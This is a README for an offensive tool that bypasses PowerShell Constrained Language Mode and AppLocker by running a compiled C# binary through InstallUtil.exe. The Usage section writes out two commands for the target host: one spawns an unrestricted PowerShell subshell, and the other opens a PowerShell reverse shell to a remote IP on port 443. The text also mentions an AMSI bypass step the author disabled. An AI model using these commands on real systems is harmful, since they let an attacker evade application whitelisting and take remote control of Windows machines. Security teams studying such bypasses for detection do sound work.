Bypass for PowerShell Constrained Language Mode
--------------------------------------------------------------------------------
This repo has a minor tweak. 
I have disabled the amsibyscan scan which didnt work in my test lab and stopped the code execution.
The new repo is still capable for creating a powershell console which bypasses Constrained Language mode :)

## Description and references 
This technique might come in handy wherever or whenever you're stuck in a low privilege PS console  
and PowerShell Version 2 engine is not available to perform a [PowerShell Downgrade Attacks](http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/).

What described above may happen in [modern] Windows OSes (like Windows 10, Windows Server 2016..),  
that nowdays are shipped out with AppLocker and PowerShell Version 5 (v5).

With AppLocker in Allow mode and PowerShell running in Constrained Mode, it is not possible for an attacker  
to change the PowerShell language mode to full in order to run attack tools.  
Imho, not beeing able to use core language functionalities (eg, load script in memory and so on..) it's a such a pain.

"PowerShell v5 detects when AppLocker Allow mode is in effect and sets the PowerShell language to Constrained Mode,  
severely limiting the attack surface on the system.  
With AppLocker in Allow mode and PowerShell running in Constrained Mode, it is not possible for an attacker  
to change the PowerShell language mode to full in order to run attack tools." [[Source]](https://adsecurity.org/?p=2604)
 
## Build the binary
The project is written in C#. All the source (few lines of codes though) is committed: .csproj, .sln ...  
IDE - Visual Studio 2015. You should be able to easily compile and build the binary with the default configuration Debug/X64.
You only may to fix the System.Management.Automation reference that is located in the GAC folder 
```dos
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
```

## Usage
Well, nothing new here as we're going to use the old and well-known trick of "InstallUtil.exe" to bypass AppLocker.
Once you've compiled the binary, issue the below command on the target host.  
Besides, your binary doesn't have to be an "exe" as InstallUtil.exe parse any file type (.txt, .bin....)

This one opens a subshell in the current console
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

This one tries to open a PS reverse shell (I've bound it into the source as a life saver :-) ..)
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

## Testing
Tested on the following environment  (Windows Server 2016)

Got the shell
